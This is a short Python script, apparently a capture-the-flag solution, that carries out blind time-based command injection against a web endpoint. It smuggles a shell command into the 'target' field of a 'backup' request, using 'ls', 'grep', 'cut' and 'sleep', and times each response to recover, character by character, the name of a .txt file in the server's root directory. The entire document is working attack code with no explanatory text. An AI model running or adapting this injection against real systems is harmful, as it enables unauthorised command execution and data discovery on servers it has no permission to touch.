import requests 
import time
url = "https://timeadventure.fiahackingisfun.id.vn/"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\!\@\#\$\%\^\&\*\(\)\-\_\+\=\~\`\[\]\{\}\|\:\;\"\'\<\>\,\.\?\/"
file_name = ""
# Enum file name: 
baseQuery = "; if [ \"$(ls / | grep .*.txt | cut -c {})\" = \"{}\" ]; then sleep 2; fi;"
while True:
    for char in charset:
        realQuery = baseQuery.format(len(file_name)+1, char)
        data = {"command": "backup", "target": realQuery}
        start_time = time.time()
        res = requests.post(url, data= data)
        end_time = time.time()
        real_time = (end_time - start_time)
        if real_time > 2:
            file_name = file_name + char
            break
    print(file_name)
